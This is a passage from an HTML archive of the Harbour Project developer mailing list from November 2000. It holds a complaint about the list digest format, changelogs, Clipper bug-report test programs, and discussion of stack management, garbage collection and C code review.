	<A HREF="mailto:harbour-request@lists.harbour-project.org">harbour-request@lists.harbour-project.org</A>

You can reach the person managing the list at
	<A HREF="mailto:harbour-admin@lists.harbour-project.org">harbour-admin@lists.harbour-project.org</A>

When replying, please edit your Subject line so it is more specific
than &quot;Re: Contents of Harbour digest...&quot;


Thank you for participating in The Harbour Project.  Be sure to check
<A HREF="http://www.Harbour-Project.org">http://www.Harbour-Project.org</A>

Today's Topics:
&gt;<i>cut here ========================================&gt;
</I>


IN MESSAGES:
This is a message sample from digest 85 (one of the most recent)

--__--__--

Message: 1
Date: Sun, 05 Nov 2000 23:21:46 +0100
From: Maurilio Longo &lt;<A HREF="mailto:maurilio.longo@libero.it">maurilio.longo@libero.it</A>&gt;
Organization: Team OS/2 Italia
To: <A HREF="mailto:harbour@lists.harbour-project.org">harbour@lists.harbour-project.org</A>
Subject: Re: [Harbour] Maurilio...
Reply-To: <A HREF="mailto:harbour@lists.harbour-project.org">harbour@lists.harbour-project.org</A>

...

--__--__--



4. Haven't any sense that items [To] and [Reply-To] appear in every
   message because they are the same, and they appear at the   beginning
   of the digest.
5. The organization could be extracted too.
6. The old digest allways have 25 mails by digest except that a timeout
   was reached.
7. Replace the fancy line:
--__--__--
by one or two lines of 78 times the lower dash like in the old digest,
by far more readable:
________________________________________________________________________
________________________________________________________________________

Message: 1
Date: Sun, 05 Nov 2000 23:21:46 +0100
From: Maurilio Longo &lt;<A HREF="mailto:maurilio.longo@libero.it">maurilio.longo@libero.it</A>&gt;
Organization: Team OS/2 Italia
Subject: Re: [Harbour] Maurilio...

Jean,
...

________________________________________________________________________
________________________________________________________________________



8. The old digest never have binary code inside.
   The current are plenty of these:

--Message-Boundary-1364

Content-type: text/plain; charset=US-ASCII
Content-disposition: inline
Content-description: Attachment information.

The following section of this message contains a file attachment
prepared for transmission using the Internet MIME message format.
If you are using Pegasus Mail, or any another MIME-compliant system,
you should be able to save it or view it from within your mailer.
If you cannot, please ask your system administrator for assistance.

   ---- File information -----------     File:  classes.c
     Date:  4 Nov 2000, 22:33    
     Size:  68410 bytes.
     Type:  Program-source

--Message-Boundary-1364
Content-type: Application/Octet-stream; name=&quot;classes.c&quot;; 
type=Program-source
Content-disposition: attachment; filename=&quot;classes.c&quot;
Content-transfer-encoding: BASE64

LyoNCiAqICRJZDogY2xhc3Nlcy5jLHYgMS4zOCAyMDAwLzEwLzMxIDE5OjUyOjE2IG1hZmFj
dCBFeHAgJA0KICovDQoNCi8qDQogKiBIYXJib3VyIFByb2plY3Qgc291cmNlIGNvZGU6DQog
   :
   : 264 lines more like it
   :
aXRlbVJlbGVhc2UoIGhiX2l0ZW1SZXR1cm4oIGFycmF5ICkgKTsNCn0NCg0KGg==

--Message-Boundary-1364--


The old digest only have one line with the note:
[This message contained attachments]


9. From some time ago, became more popular the reply, of the reply of the..
so for read a couple of lines we must read dozens, hundreds of those
reply-lines. see for yourself:

cut here ========================================&gt;

&gt;<i> &gt; &gt; JF Lefebvre ha scritto:
</I>&gt;<i> &gt; &gt; &gt;&gt; &gt; &gt; &gt; Hi Maurilio
</I>&gt;<i> &gt; &gt; &gt;
</I>&gt;<i> &gt; &gt; &gt; &gt; moving super:XX call as first thing done during New() execution
</I>&gt;<i>didn't
</I>&gt;<i> &gt; fix
</I>&gt;<i> &gt; &gt; &gt; &gt; my problem which is an exception (invalid address accessed) 
</I>&gt;<i>insi=de
</I>&gt;<i> &gt; &gt; &gt; &gt; TCLASS(105) (mostly, that is, sometimes exception happens at a
</I>&gt;<i> &gt; different
</I>&gt;<i> &gt; &gt; &gt; &gt; line inside TCLASS); it simply postponed it a little.
</I>&gt;<i> &gt; &gt; &gt;
</I>&gt;<i> &gt; &gt; &gt; Are you sure it could not be related to some memory corruption ?
</I>&gt;<i> &gt; &gt; &gt;
</I>&gt;<i> &gt; &gt; &gt; &gt; I can send to you all my code, but I'm using OS/2 and GCC as my
</I>&gt;<i> &gt; platform
</I>&gt;<i> &gt; &gt; &gt; &gt; so it won't compile without some makefile tweaking and after you
</I>&gt;<i>have
</I>&gt;<i> &gt; a
</I>&gt;<i> &gt; &gt; &gt; &gt; MySQL server running.
</I>&gt;<i> &gt; &gt; &gt;
</I>&gt;<i> &gt; &gt; &gt; About MySql, no problem but in all case, I know (by experience :-(= 
</I>&gt;<i>)
</I>&gt;<i> &gt; &gt; &gt; it's very uneasy to track a problem within a real app. You can sen=
</I>d
&gt;<i> &gt; &gt; &gt; me the code if you want I have a look but I'm not sure it will hel=
</I>p
&gt;<i> &gt; &gt; &gt; for the problem.
</I>&gt;<i> &gt; &gt; &gt;
</I>&gt;<i> &gt; &gt; &gt; &gt; I did try to create a small example which dies in the same manne=
</I>r,
&gt;<i>but
</I>&gt;<i> &gt; I
</I>&gt;<i> &gt; &gt; &gt; &gt; wasn't able to do it.
</I>&gt;<i> &gt; &gt; &gt;
</I>&gt;<i> &gt; &gt; &gt; :-((((((((((((((
</I>&gt;<i> &gt; &gt; &gt;
</I>&gt;<i> &gt; &gt; &gt; Best regards,
</I>&gt;<i> &gt; &gt; &gt;
</I>&gt;<i> &gt; &gt; &gt; J. Lefebvre,
</I>&gt;<i> &gt; &gt; &gt; Bruxelles,
</I>&gt;<i> &gt; &gt; &gt; Belgium
</I>&gt;<i> &gt; &gt; &gt;
</I>&gt;<i> &gt; &gt;
</I>&gt;<i> &gt; &gt; --
</I>&gt;<i> &gt; &gt;
</I>&gt;<i> &gt; &gt;  __________
</I>&gt;<i> &gt; &gt; |  |  | |__| <A HREF="mailto:md2520@mclink.it">md2520@mclink.it</A>
</I>&gt;<i> &gt; &gt; |_|_|_|____| Team OS/2 Italia
</I>&gt;<i> &gt; &gt; _______________________________________________
</I>&gt;<i> &gt; &gt; Harbour mailing list
</I>&gt;<i> &gt; &gt; <A HREF="mailto:Harbour@lists.harbour-project.org">Harbour@lists.harbour-project.org</A>
</I>&gt;<i> &gt; &gt; <A HREF="http://www.matrixlist.com/mailman/listinfo/harbour">http://www.matrixlist.com/mailman/listinfo/harbour</A>
</I>&gt;<i> &gt; &gt;
</I>&gt;<i> &gt; &gt; Thank you for participating in The Harbour Project.  Be sure to chec=
</I>k
&gt;<i> &gt; &gt; <A HREF="http://www.Harbour-Project.org">http://www.Harbour-Project.org</A>
</I>&gt;<i> &gt; &gt;
</I>&gt;<i> &gt;
</I>&gt;<i> &gt; _______________________________________________
</I>&gt;<i> &gt; Harbour mailing list
</I>&gt;<i> &gt; <A HREF="mailto:Harbour@lists.harbour-project.org">Harbour@lists.harbour-project.org</A>
</I>&gt;<i> &gt; <A HREF="http://www.matrixlist.com/mailman/listinfo/harbour">http://www.matrixlist.com/mailman/listinfo/harbour</A>
</I>&gt;<i> &gt;
</I>&gt;<i> &gt; Thank you for participating in The Harbour Project.  Be sure to check
</I>&gt;<i> &gt; <A HREF="http://www.Harbour-Project.org">http://www.Harbour-Project.org</A>
</I>&gt;<i> &gt;
</I>&gt;<i>
</I>&gt;<i>_______________________________________________
</I>&gt;<i>Harbour mailing list
</I>&gt;<i><A HREF="mailto:Harbour@lists.harbour-project.org">Harbour@lists.harbour-project.org</A>
</I>&gt;<i><A HREF="http://www.matrixlist.com/mailman/listinfo/harbour">http://www.matrixlist.com/mailman/listinfo/harbour</A>
</I>&gt;<i>
</I>&gt;<i>Thank you for participating in The Harbour Project.  Be sure to check
</I>&gt;<i><A HREF="http://www.Harbour-Project.org">http://www.Harbour-Project.org</A>
</I>&gt;<i>
</I>&gt;<i>
</I>cut here ========================================&gt;


This is no a personal attack again nobody, just something we can avoid,
and keep mails smaller.


10. I also note when lines are longer of 75 characters, the equal '='
    symbol is added in between of the word and the word continue below
    in the next line.

I remember that somebody posted some request like mine, this is a
reminder.

Thanks in advance. Regards
Alejandro
_________________________________________________________________________
Get Your Private, Free E-mail from MSN Hotmail at <A HREF="http://www.hotmail.com.">http://www.hotmail.com.</A>

Share information about yourself, create your own public profile at 
<A HREF="http://profiles.msn.com.">http://profiles.msn.com.</A>


</PRE>

From harbour@lists.harbour-project.org  Mon Nov  6 23:21:03 2000
Date: Mon Nov  6 23:21:03 2000
From: Phil Barnett harbour@lists.harbour-project.org
Subject: [Harbour] digest

<PRE>On 7 Nov 2000, at 3:55, Alejandro de Garate wrote:

&gt;<i> Changes desired from a digest's user POV:
</I>&gt;<i> ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
</I>
There are all nice ideas, but they are not options in the current 
release of Mailman, which is our mailing list software.

As far as content, the current archives and digests contain 
everything that was mailed. Egroups removed content, and even 
though you may think this is a good idea, you also don't know what 
was removed that shouldn't have been due to recognition failures.

We have recently talked about a binary group, but no decision was 
made as to it's use, but it would reduce internet bandwidth use and 
would keep this list mostly text.

In that vein, it would be a good idea to put attached files in a 
different list.


-- 
              Phil Barnett  mailto:<A HREF="mailto:midnight@the-oasis.net">midnight@the-oasis.net</A>
                       WWW  <A HREF="http://www.the-oasis.net/">http://www.the-oasis.net/</A>
                  FTP Site  <A HREF="ftp://ftp.the-oasis.net">ftp://ftp.the-oasis.net</A>

</PRE>

From harbour@lists.harbour-project.org  Tue Nov  7 01:13:02 2000
Date: Tue Nov  7 01:13:02 2000
From: Ron Pinkas harbour@lists.harbour-project.org
Subject: [Harbour] 2000-11-06 22:10 UTC+0800 Ron Pinkas <ron@profit-master.com>

<PRE>2000-11-06 22:10 UTC+0800 Ron Pinkas &lt;<A HREF="mailto:ron@profit-master.com">ron@profit-master.com</A>&gt;
   * source/compiler/cmdcheck.c
   * utils/hbpp/hbpp.c
     + Added support for complex Command Line #defines

   * source/pp/ppcore.c
     * Renamed ParseDefine() to hb_pp_ParseDefine() and made it public.

</PRE>

From harbour@lists.harbour-project.org  Tue Nov  7 01:15:04 2000
Date: Tue Nov  7 01:15:04 2000
From: Ron Pinkas harbour@lists.harbour-project.org
Subject: [Harbour] PP command line

<PRE>John,

&gt;<i> [To Alexander - and Ron if it applies to dot's PP?]
</I>&gt;<i>
</I>&gt;<i> As you know, Clipper's PP allows /dXXX and that works for Harbour's
</I>&gt;<i> PP, too. :-)
</I>&gt;<i>
</I>&gt;<i> However, Clipper also allows /dXXX=YYY (same as #define XXX YYY
</I>&gt;<i> and yes, it's case sensitive like #define is).  That doesn't appear
</I>&gt;<i> to work with Harbour.  Would it be easy to add, please?
</I>&gt;<i>
</I>&gt;<i> I'm not too sure how clever Clipper is, i.e. whether you can use
</I>&gt;<i> e.g. /dPseudoFunc(xxx,yyy)=SomethingElse(yyy,xxx).
</I>
Done.

BTW, Clipper does not support complex defines as above, but now Harbour
does.

Ron


</PRE>

From harbour@lists.harbour-project.org  Tue Nov  7 02:01:01 2000
Date: Tue Nov  7 02:01:01 2000
From: Antonio Linares harbour@lists.harbour-project.org
Subject: [Harbour] Harbour dynamic stack

<PRE>JF,

&gt;<i> If some other place GPF due to the same problem, I 
</I>&gt;<i> think the problem must be resolved in place of changing what I see 
</I>&gt;<i> as a very good stack management. I was just unaware of the 
</I>&gt;<i> restriction.
</I>
I am so glad that you fully understand Harbour dynamic stack now :-)

In my opinion, Harbour has the best stack implementation as every
application will stabilize its stack at the exact size that it needs.

This means that we don't have to waste unused memory, or run out of
stack. 

Regarding Ron thoughts about speed (cause reallocating the stack) the
solution is to find the optimum chunck size that the stack should use
to get expanded and reduced.

Antonio 

</PRE>

From harbour@lists.harbour-project.org  Tue Nov  7 03:55:04 2000
Date: Tue Nov  7 03:55:04 2000
From: rglab harbour@lists.harbour-project.org
Subject: [Harbour] Type() bug

<PRE>Brian Hays wrote:
 
&gt;<i> Will anyone be able to look into the Type() bug I posted the other day?
</I>
  I am looking at it.

Regards, Ryszard

</PRE>

From harbour@lists.harbour-project.org  Tue Nov  7 04:02:04 2000
Date: Tue Nov  7 04:02:04 2000
From: Chen Kedem harbour@lists.harbour-project.org
Subject: [Harbour] Re: bug in GET

<PRE>with CHANGELOG 2000-11-06 22:10 UTC+0800 by Ron Pinkas
the following anomaly exist with the GET system:

OS: Win95, Compiler: BCB3.0, Makefile: make_b32.bat and b32_slex.bat

1. SET KEY to a function key does NOT work, SET KEY to SHIFT/CTRL/ALT
   function key DO work (both flex and slex).

-------------------------------------------
#include &quot;inkey.ch&quot;
PROCEDURE main
PUBLIC myGetVar := &quot;  &quot;
SET KEY K_F1      TO help   // not working
SET KEY K_F2      TO help   // not working
SET KEY K_SH_F1   TO help   // Ok
SET KEY K_CTRL_F1 TO help   // Ok
SET KEY K_ALT_F1  TO help   // Ok
CLS
@ 10, 10 SAY &quot;Please Press F1&quot; GET myGetVar
READ
RETURN

PROCEDURE help
? &quot;Called from HELP, LastKey=&quot;, LastKey()
RETURN
-------------------------------------------

2. using array as get variable DO work (both lexer),
   using macro as get variable does NOT work (both lexer).
   
------------- Get var is ARRAY ------------
PROCEDURE main
PUBLIC ar[3], i
ar[1]:= ar[2]:= ar[3]:= space( 5 )
CLS
FOR i = 1 TO 3
  @ 10+i, 10 SAY str( i, 1 ) + &quot;:&quot; GET ar[i]
NEXT
READ
FOR i = 1 to 3
  ? i, ar[i]
NEXT
RETURN
-------------------------------------------

------------- Get var is MACRO ------------
PROCEDURE main
PUBLIC i, macro
PUBLIC var1, var2, var3
var1 := var2 := var3 := space( 5 )
CLS
FOR i = 1 TO 3
  macro := &quot;var&quot; + str( i, 1 )
  @ 10+i, 10 SAY str( i ,1 ) + &quot;:&quot; GET &amp;macro
NEXT
READ
FOR i = 1 to 3
  macro := &quot;var&quot; + str( i, 1 )
  ? i, &amp;macro
NEXT
RETURN
-------------------------------------------

all samples work when complied with Clipper 5.2e


  Chen.

</PRE>

From harbour@lists.harbour-project.org  Tue Nov  7 04:13:02 2000
Date: Tue Nov  7 04:13:02 2000
From: John Skelton harbour@lists.harbour-project.org
Subject: Odp: [Harbour] Re : dynsym.c caused GPF

<PRE>Marek,

&gt;<i> Yes, unless the caller passed it by ref. (@cStr), in which case it's
</I>&gt;<i> OK to modify it directly.  (It's also OK to use _storc() of course,
</I>&gt;<i> though rather wasteful.)  FWRITE() is an example, in the sense that
</I>&gt;<i> this general rule applies to it just as it applies to other C code
</I>&gt;<i> (i.e. FWRITE() is not special).
</I>
&quot;I am really not sure this is a good technique in Clipper, John !&quot;

You're kidding - right?  It's really standard. &lt;g&gt;

&quot;Since a pointer can point to a string which is shared by more than
one Clipper level var&quot;

Not true when &quot;@&quot; is used.  It's one of the points of the @ operator,
and that is why fwrite() can safely use the buffer you pass in.

Someone confirm this. :-) :-)

John.

</PRE>

From harbour@lists.harbour-project.org  Tue Nov  7 04:13:17 2000
Date: Tue Nov  7 04:13:17 2000
From: John Skelton harbour@lists.harbour-project.org
Subject: [Harbour] VC++ / SIMPLEX

<PRE>Ron,

&quot;What is the special kludge?&quot;

To use -Tp instead of -TP.  In turn it means some &quot;for&quot; loops, but
sadly that means the return code doesn't get checked.  Not a problem
for me, really, but I would restore the -TP for the version I contrib
and thus would prefer someone tested it. :-)

John.

</PRE>

From harbour@lists.harbour-project.org  Tue Nov  7 04:15:03 2000
Date: Tue Nov  7 04:15:03 2000
From: rglab harbour@lists.harbour-project.org
Subject: [Harbour] ChangeLog 2000-11-04 13:35 UTC+0100

<PRE>rglab wrote:

&gt;<i>     *source/vm/codebloc.c
</I>&gt;<i>     *source/vm/itemapi.c
</I>&gt;<i>     *source/vm/memvars.c
</I>&gt;<i>         * fixed reference counting for detached local variables
</I>&gt;<i>         (This should cure many random core dumps/GPFs)
</I>
  I am sorry, this is not a correct solution of our problems. 
The real problem is the order of memory deallocation in the garbage
collector. I will correct it by dividing a deallocation step into two
steps:
-reference counter decrementing (during this step the memory managed by
the GC cannot be deallocated since it can be referenced by other items
that are also marked for deletion)
-memory deallocation

Regards, Ryszard

</PRE>

From harbour@lists.harbour-project.org  Tue Nov  7 05:22:02 2000
Date: Tue Nov  7 05:22:02 2000
From: rglab harbour@lists.harbour-project.org
Subject: [Harbour] ChangeLog 2000-11-04 13:35 UTC+0100

<PRE>Ron Pinkas wrote:

&gt;<i> I agree that the code block should be created inside __GET(), and I also
</I>&gt;<i> agree that such code block is more efficient without use of macro (in fact I
</I>&gt;<i> was just about to make this change). What I don't understand is _why_ move
</I>&gt;<i> this logic into Expression Optimizer? Can you please explain what benefit
</I>&gt;<i> does it offer?
</I>
  flex - is for lexical analysis (keyword look-up)
  bison - syntax analysis (translation of keywords sequence into syntax
expressions)
  expression optimizer - the name says all - _GET_ handling is
just some kind of optimization. 

&gt;<i> I see one clear disadvantage in that it is far less obvious that way. One
</I>&gt;<i> would have far more difficult time finding this kind of mangling.
</I>
  It handles mangling in more efficient method - no additional
complicated bison rules, no static variables. You will see more
advantages when I will finish support for macro variables and object
variables.
  It makes the mangling avaliable for macro compiler - yes, Clipper
doesn't support it which in my opinion is a disadvantage. However it is
easier to include/exclude such support placed in expression optimizer
than placing it in bison rules. Handling _GET_ in macro compiler in the
same way as in the harbour compiler will make easier GET usage in
scripting because it will be not required to distinguish editing of
plain variables from arrays.

&gt;<i> Why change something that is working correctly? (especially if contributed
</I>&gt;<i> by someone else!!!)
</I>
  You wrote: ,,feel free to implement it any way wish'' - so I did it.

&gt;<i> Was there any bug you can point to?
</I>
  There was bug in harbour.l, there was bug in pptable.c (using a local
_1 variable - BTW, why simplex user cannot edit '_1' variable?) -
removing a codeblock from pptable.c caused that all rules in harbour.y
required rewriting from the beginning. Support for macro expressions
(&amp;var) become invalid, support for object variables become invalid.

Regards, Ryszard

</PRE>

From harbour@lists.harbour-project.org  Tue Nov  7 10:35:03 2000
Date: Tue Nov  7 10:35:03 2000
From: rglab harbour@lists.harbour-project.org
Subject: [Harbour] ChangeLog 2000-11-07 16:25 UTC+0100

<PRE>    *include/hbexpra.c
    *source/compiler/expropta.c
    *source/macro/macroa.c
        *fixed internal _GET_ optimization for macro variables
        
    *source/rtl/tgetint.prg
        *__GET uses macro operator if no initial value is passed and
         there is no set/get block

Regards, Ryszard

</PRE>

From harbour@lists.harbour-project.org  Tue Nov  7 11:02:02 2000
Date: Tue Nov  7 11:02:02 2000
From: Juan Agustin Barriga harbour@lists.harbour-project.org
Subject: [Harbour] Memory allocated but not released

<PRE>This is a multi-part message in MIME format.

------=_NextPart_000_0044_01C048B9.C14BE4E0
Content-Type: text/plain;
	charset=&quot;iso-8859-1&quot;
Content-Transfer-Encoding: quoted-printable

I have just downloaded/compiled the lattest CVS, and I'm surprised by =
warnings of not released memory blocks. A GOOD surprise. I fixed two of =
them, but I need a place where to free memory allocated on the Init =
procedure. Is there a RddFree, or the like? I also get this one:
source\vm\fm.c:424: HB_TR_ERROR Block 2 (size 256) DBUSEAREA(0)
A memory leak on fm.c? something I'm doing wrong on my tcpOpen? or in =
the default RDD one? Anybody remember the DBOPENINFO.abName question?

By the way, can someone with rights apply my rddcpy.c change to the CVS?
Thanks

Harrier

------=_NextPart_000_0044_01C048B9.C14BE4E0
Content-Type: text/html;
	charset=&quot;iso-8859-1&quot;
Content-Transfer-Encoding: quoted-printable

&lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.0 Transitional//EN&quot;&gt;
&lt;HTML&gt;&lt;HEAD&gt;
&lt;META content=3D&quot;text/html; charset=3Diso-8859-1&quot; =
http-equiv=3DContent-Type&gt;
&lt;META content=3D&quot;MSHTML 5.00.3207.2500&quot; name=3DGENERATOR&gt;
&lt;STYLE&gt;&lt;/STYLE&gt;
&lt;/HEAD&gt;
&lt;BODY bgColor=3D#ffffff&gt;
&lt;DIV&gt;&lt;FONT face=3DArial size=3D2&gt;I have just downloaded/compiled the =
lattest CVS,=20
and I'm surprised by warnings of not released memory blocks. A GOOD =
surprise. I=20
fixed two of them, but I need a place where to free memory allocated on =
the Init=20
procedure. Is there a RddFree, or the like? I also get this =
one:&lt;/FONT&gt;&lt;/DIV&gt;
&lt;DIV&gt;&lt;FONT face=3DArial size=3D2&gt;source\vm\fm.c:424: HB_TR_ERROR Block 2 =
(size 256)=20
DBUSEAREA(0)&lt;/FONT&gt;&lt;/DIV&gt;
&lt;DIV&gt;&lt;FONT face=3DArial size=3D2&gt;A memory leak on fm.c? something I'm =
doing wrong on=20
my tcpOpen? or in the default RDD one? Anybody remember the =
DBOPENINFO.abName=20
question?&lt;/FONT&gt;&lt;/DIV&gt;
&lt;DIV&gt;&amp;nbsp;&lt;/DIV&gt;
&lt;DIV&gt;&lt;FONT face=3DArial size=3D2&gt;By the way, can someone with rights =
apply my=20
rddcpy.c change to the CVS?&lt;/FONT&gt;&lt;/DIV&gt;
&lt;DIV&gt;&lt;FONT face=3DArial size=3D2&gt;Thanks&lt;/FONT&gt;&lt;/DIV&gt;
&lt;DIV&gt;&amp;nbsp;&lt;/DIV&gt;
&lt;DIV&gt;&lt;FONT face=3DArial size=3D2&gt;Harrier&lt;/FONT&gt;&lt;/DIV&gt;&lt;/BODY&gt;&lt;/HTML&gt;

------=_NextPart_000_0044_01C048B9.C14BE4E0--


</PRE>

From harbour@lists.harbour-project.org  Tue Nov  7 11:26:02 2000
Date: Tue Nov  7 11:26:02 2000
From: Ron Pinkas harbour@lists.harbour-project.org
Subject: [Harbour] Re: bug in GET

<PRE>Chen,

Thanks for the info. The Macro bug is actually _not_ a GET bug but rather a
code block bug.

In clipper Macros within CodeBlock are EARLY expanded unless parenthesized.

Note the following:

//------------------------------ //
PROCEDURE Main

   LOCAL bBlock := Array(3)
   PUBLIC i, macro
   PUBLIC var1, var2, var3

   var1 := &quot;Var1&quot;
   var2 := &quot;Var2&quot;
   var3 := &quot;Var3&quot;

   CLS

   FOR i = 1 TO 3
      macro := &quot;var&quot; + str( i, 1 )
      bBlock[i] := {|| &amp;Macro }
   NEXT

   FOR i = 1 TO 3
      ? Eval( bBlock[i] )
   NEXT

   FOR i = 1 TO 3
      macro := &quot;var&quot; + str( i, 1 )
      bBlock[i] := {|| &amp;(Macro) }
   NEXT

   FOR i = 1 TO 3
      ? Eval( bBlock[i] )
   NEXT

RETURN
//------------------------------ //

Ron

&gt;<i> 2. using array as get variable DO work (both lexer),
</I>&gt;<i>    using macro as get variable does NOT work (both lexer).
</I>&gt;<i>
</I>&gt;<i> ------------- Get var is MACRO ------------
</I>&gt;<i> PROCEDURE main
</I>&gt;<i> PUBLIC i, macro
</I>&gt;<i> PUBLIC var1, var2, var3
</I>&gt;<i> var1 := var2 := var3 := space( 5 )
</I>&gt;<i> CLS
</I>&gt;<i> FOR i = 1 TO 3
</I>&gt;<i>   macro := &quot;var&quot; + str( i, 1 )
</I>&gt;<i>   @ 10+i, 10 SAY str( i ,1 ) + &quot;:&quot; GET &amp;macro
</I>&gt;<i> NEXT
</I>&gt;<i> READ
</I>&gt;<i> FOR i = 1 to 3
</I>&gt;<i>   macro := &quot;var&quot; + str( i, 1 )
</I>&gt;<i>   ? i, &amp;macro
</I>&gt;<i> NEXT
</I>&gt;<i> RETURN
</I>&gt;<i> -------------------------------------------
</I>&gt;<i>
</I>&gt;<i> all samples work when complied with Clipper 5.2e
</I>&gt;<i>
</I>&gt;<i>
</I>&gt;<i>   Chen.
</I>

</PRE>

From harbour@lists.harbour-project.org  Tue Nov  7 15:13:02 2000
Date: Tue Nov  7 15:13:02 2000
From: Luiz Rafael Culik Guimaraes harbour@lists.harbour-project.org
Subject: [Harbour] Memory allocated but not released

<PRE>Harrier

I can upload your modified rddcpy.c

Regards

Luiz Rafael Culik


</PRE>

From harbour@lists.harbour-project.org  Tue Nov  7 15:15:02 2000
Date: Tue Nov  7 15:15:02 2000
From: Marek Paliwoda harbour@lists.harbour-project.org
Subject: Odp: [Harbour] Re : dynsym.c caused GPF

<PRE>&gt;<i> Not true when &quot;@&quot; is used.  It's one of the points of the @
</I>&gt;<i> operator, and that is why fwrite() can safely use the buffer
</I>&gt;<i> you pass in.
</I>&gt;<i>
</I>&gt;<i> Someone confirm this. :-) :-)
</I>
I am sorry, John !

Simple test showed me You are right !

I assumed that reading Clipper doc but I did not tested 
it before. Sorry again.

Marek Paliwoda




</PRE>

From harbour@lists.harbour-project.org  Tue Nov  7 15:39:02 2000
Date: Tue Nov  7 15:39:02 2000
From: Victor Szakats harbour@lists.harbour-project.org
Subject: [Harbour] COPY TO errors

<PRE>Harrier,

Let me allow some suggestions:

1) Last time I've made a suggestion which I'd correct/optimizes a bit, 
so that hb_param() will always return NULL if the parameter 
doesn't exist or the type differs from the specified one.

2) As some kind of futher optimization you can avoid checking the 
NUM/LOG types if the default values are zero/FALSE, since hb_parn*() 
and hb_parl() will return those values anyway, when you do use this 
feature, it's good to make a comment about it.

3) The other - new - formal bug is that you pass NULL for LONG, 
ULONG, BOOL parameters, it will work, but the the usage of 
NULL may be misleading for the reader.

4) The type of the first parameter is not checked, so the function 
will probably fail if the first parameter is not a string, since hb_parc(1) 
will then pass an empty string (&quot;&quot;) to rddMoveRecords(). The 
correct behaviour is probably (should check C52e) to do nothing 
when ! ISCHAR(1) (or maybe to pass a NULL ?)

5) There's one ISNUM() instead of ISLOG() in the code.

6) hb_parl() should be used for BOOL/logical values instead of hb_parnl() 
(note that hb_parnl() will still work, but it's also misleading).

7) You should use hb_parnl() insead of hb_parni() to retrieve 
record number related values, as they may exceed the INT limit 
on 16bit systems.

8) Don't use // comments, as this is not ANSI C compatible, and some 
compilers may not like it.

9) Should check against C52e, but I have the impression that CA-Clipper 
__DBAPP() and __DBCOPY() will always return NIL.

10) Don't forget to add a CVS ID and copyright header to your code.

So this could:
-------------------------------------------------------------------------
  hb_retni( rddMoveRecords(  hb_parc( 1 ), // File From
                             NULL,         // TO current area
                             ISARRAY( 2 ) ? hb_param( 2, HB_IT_ARRAY ) : NULL, // Fuelds
                             ISBLOCK( 3 ) ? hb_param( 3, HB_IT_BLOCK ) : NULL, // For
                             ISBLOCK( 4 ) ? hb_param( 4, HB_IT_BLOCK ) : NULL, // While
                             ISNUM( 5 ) ? hb_parni( 5 ) : NULL,                // Next
                             ISNUM( 6 ) ? hb_parni( 6 ) : NULL,                // Record
                             ISNUM( 7 ) ? hb_parnl( 7 ) : NULL,                // Rest
                             ISCHAR( 8 ) ? hb_parc( 8 ) : NULL ));             // RDD 
-------------------------------------------------------------------------

IMHO looks and works better this way:
-------------------------------------------------------------------------
if( ISCHAR( 1 ) )
{
   rddMoveRecords(  hb_parc( 1 ), /* File From */
      NULL,         /* TO current area */
      hb_param( 2, HB_IT_ARRAY ), /* Fuelds */
      hb_param( 3, HB_IT_BLOCK ), /* For */
      hb_param( 4, HB_IT_BLOCK ), /* While */
      hb_parnl( 5 ),                /* Next */ /* Defaults to zero on bad type */
      hb_parnl( 6 ),                /* Record */ /* Defaults to zero on bad type */
      hb_parl( 7 ),                /* Rest */ /* Defaults to zero on bad type */
      ISCHAR( 8 ) ? hb_parc( 8 ) : NULL ));             /* RDD */
}
-------------------------------------------------------------------------

Victor Szakats



</PRE>

From harbour@lists.harbour-project.org  Tue Nov  7 17:00:06 2000
Date: Tue Nov  7 17:00:06 2000
From: Maurilio Longo harbour@lists.harbour-project.org
Subject: [Harbour] Maurilio... CHANGELOG: 2000-11-05 19:52 GMT+1

<PRE>Hi Jean,

sorry to say that resetting hvm.c initial stack size gives me this:

Exception c0000005 at address 192c5
Called from TCLASS:CREATE(166)
Called from TSCEGLIQUERY(19)
Called from TSQLEDITOR:SELEZIONAQUERY(144)
Called from TSQLEDITOR:KEYBOARDHOOK(113)
Called from TSQLEDITOR:EDIT(896)
Called from MAIN(64)

Process terminated by SIGSEGV
core dumped
SYS1808:
Il processo è terminato. Il codice per la diagnostica
software (codice dell'errore) è  0005.

(H:\repository\mysql)


I don't have time now to dig it deeper, but it seems to me the very same
problem :-(

regards.



JF Lefebvre ha scritto:
&gt;<i> 
</I>&gt;<i> Hi Maurilio
</I>&gt;<i> 
</I>&gt;<i> &gt; 2000-11-05 19:52 GMT+1 Maurilio Longo &lt;<A HREF="mailto:maurilio.longo@libero.it">maurilio.longo@libero.it</A>&gt;
</I>&gt;<i> &gt;    * source/vm/hvm.c
</I>&gt;<i> &gt;       * I keep getting exceptions during class use due to harbour stack
</I>&gt;<i> &gt; management,
</I>&gt;<i> &gt;         so, until all code is checked and made compatible with harbour
</I>&gt;<i> &gt; stack I have
</I>&gt;<i> &gt;         increased
</I>&gt;<i> &gt;         STACK_INITHB_ITEMS      to 2000 (from 100)
</I>&gt;<i> &gt;         STACK_EXPANDHB_ITEMS    to 200  (20)
</I>&gt;<i> 
</I>&gt;<i> I just cvsed my last (and carefully checked :-) ) classes.c
</I>&gt;<i> 
</I>&gt;<i> Coud you please recheck it against ;-) the stack with the old init
</I>&gt;<i> value (100,20). Let me know if you expected any more errors ( and
</I>&gt;<i> if yes where ).
</I>&gt;<i> 
</I>&gt;<i> Best regards,
</I>&gt;<i> 
</I>&gt;<i> J. Lefebvre,
</I>&gt;<i> Bruxelles,
</I>&gt;<i> Belgium
</I>&gt;<i> 
</I>&gt;<i> _______________________________________________
</I>&gt;<i> Harbour mailing list
</I>&gt;<i> <A HREF="mailto:Harbour@lists.harbour-project.org">Harbour@lists.harbour-project.org</A>
</I>&gt;<i> <A HREF="http://www.matrixlist.com/mailman/listinfo/harbour">http://www.matrixlist.com/mailman/listinfo/harbour</A>
</I>&gt;<i> 
</I>&gt;<i> Thank you for participating in The Harbour Project.  Be sure to check
</I>&gt;<i> <A HREF="http://www.Harbour-Project.org">http://www.Harbour-Project.org</A>
</I>
-- 

 __________                   
|<i>  |  | |__| <A HREF="mailto:md2520@mclink.it">md2520@mclink.it</A> 
</I>|<i>_|_|_|____| Team OS/2 Italia
</I>
</PRE>

From harbour@lists.harbour-project.org  Tue Nov  7 17:06:02 2000
Date: Tue Nov  7 17:06:02 2000
From: Ron Pinkas harbour@lists.harbour-project.org
